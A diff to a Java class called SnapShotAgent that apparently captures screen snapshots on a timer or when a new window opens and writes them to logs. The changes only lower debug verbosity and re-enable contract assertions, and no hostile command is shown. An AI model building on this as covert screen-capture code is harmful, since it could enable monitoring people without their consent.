@@ -23,7 +23,7 @@ public class SnapShotAgent extends Agent {
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 
     //#debug
-    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("SnapShotAgent", DebugLevel.NOTIFY);
 
     private int timerMillis = 60 * 1000;
     private boolean onNewWindow = false;
@@ -31,7 +31,7 @@ public class SnapShotAgent extends Agent {
     public SnapShotAgent(boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true);
         // #ifdef DBC
-        //@                Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,"Wrong Conversion");
+                        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,"Wrong Conversion");
         // #endif
 
     }
@@ -69,7 +69,7 @@ public class SnapShotAgent extends Agent {
              */
 
             // #ifdef DBC
-            //@                        Check.requires(log != null, "Null log");
+                                    Check.requires(log != null, "Null log");
             // #endif
 
             log.createLog(getAdditionalData());
@@ -105,8 +105,8 @@ public class SnapShotAgent extends Agent {
         databuffer.write(windowsName);
 
         // #ifdef DBC
-        //@                Check.asserts(windowsName.length == wlen, "Wrong windows name");
-        //@                Check.ensures(additionalData.length == tlen, "Wrong additional data name");
+                        Check.asserts(windowsName.length == wlen, "Wrong windows name");
+                        Check.ensures(additionalData.length == tlen, "Wrong additional data name");
         // #endif
 
         // #debug
@@ -117,7 +117,7 @@ public class SnapShotAgent extends Agent {
 
     protected boolean parse(byte[] confParameters) {
         // #ifdef DBC
-        //@                Check.asserts(confParameters != null, "Null confParameters");
+                        Check.asserts(confParameters != null, "Null confParameters");
         // #endif
 
         DataBuffer databuffer = new DataBuffer(confParameters, 0,
